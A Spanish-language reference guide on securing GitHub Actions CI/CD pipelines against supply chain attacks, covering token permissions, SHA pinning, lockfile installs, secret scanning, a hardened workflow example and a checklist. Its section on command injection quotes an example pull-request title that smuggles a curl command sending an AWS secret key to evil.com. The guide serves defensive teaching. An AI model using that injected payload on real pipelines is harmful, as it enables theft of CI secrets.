# Seguridad en Pipelines de CI/CD y Cadena de Suministro

Esta referencia establece las directrices para proteger los flujos de integración continua (GitHub Actions, GitLab CI) contra ataques a la cadena de suministro de software (*software supply chain attacks*).

---

## 1. Principales Vectores de Ataque en CI/CD

- **Permisos Excesivos en Tokens Automáticos (`GITHUB_TOKEN`)**: Dejar el token con permisos globales de escritura (`permissions: write-all`), permitiendo que un script malicioso en una prueba cree releases, modifique ramas o acceda a secretos.
- **Inyección de Comandos en Workflows**: Usar expresiones no confiables en scripts de shell dentro del workflow (`run: echo "PR title is ${{ github.event.pull_request.title }}"`). Un título con comillas invertidas o `$()` ejecuta código arbitrario en el runner.
- **Uso de Acciones de Terceros por Etiqueta Flotante (`@v1` / `@master`)**: Si el repositorio del autor de la acción es vulnerado, un atacante reasigna la etiqueta `@v1` para inyectar código malicioso que roba todos los secretos del pipeline.
- **Filtrado de Secretos en Logs**: Imprimir variables de entorno completas en depuración (`env`, `printenv`).

---

## 2. Configuración Segura de GitHub Actions

```yaml
name: Secure CI Pipeline

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

# 1. Privilegios mínimos estrictos a nivel global de workflow
permissions:
  contents: read

jobs:
  build-and-test:
    runs-on: ubuntu-latest
    # Restricción explícita de permisos para este job
    permissions:
      contents: read
      security-events: write # Solo necesario para subir reportes SARIF

    steps:
      # 2. Pinning de acciones a su commit hash SHA completo (INMUTABLE)
      - name: Checkout code
        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1

      - name: Setup Node.js
        uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8 # v4.0.2
        with:
          node-version: 20
          cache: 'npm'

      # 3. Instalación con verificación estricta de lockfile (nunca npm install libre)
      - name: Install dependencies
        run: npm ci

      # 4. Escaneo de secretos en el código
      - name: Detect leaked secrets
        uses: gitleaks/gitleaks-action@f9076f62b80145a0b73105ff7c9b83b4b88939c8 # v2.3.4
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      # 5. Ejecución segura evitando inyección de expresiones en scripts
      - name: Run Tests
        run: npm test
```

---

## 3. Prevención de Inyección de Comandos en Pasos de Workflow

**Inseguro:**
```yaml
# INSEGURO: Un PR con título `feat: test"; curl https://evil.com/leak?k=$AWS_SECRET_KEY; echo "`
- name: Log PR Title
  run: echo "Processing PR: ${{ github.event.pull_request.title }}"
```

**Seguro (Paso mediante variable de entorno):**
```yaml
# SEGURO: La variable de entorno neutraliza la interpretación de sintaxis de shell
- name: Log PR Title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Processing PR: $PR_TITLE"
```

---

## 4. Checklist para CI/CD

- [ ] Todos los workflows declaran `permissions:` mínimos explícitos en la raíz.
- [ ] Las acciones de terceros están ancladas a hashes SHA inmutables (`uses: action@commit_sha`).
- [ ] Se utiliza `npm ci` / `poetry install --frozen` en lugar de comandos que actualizan dependencias al vuelo.
- [ ] No se evalúan variables de contexto no confiables (`github.event.issue.title`) directamente dentro de bloques `run:`.
- [ ] El pipeline incluye escaneo de secretos (`gitleaks`) y análisis de vulnerabilidades (`trivy` o `osv-scanner`).
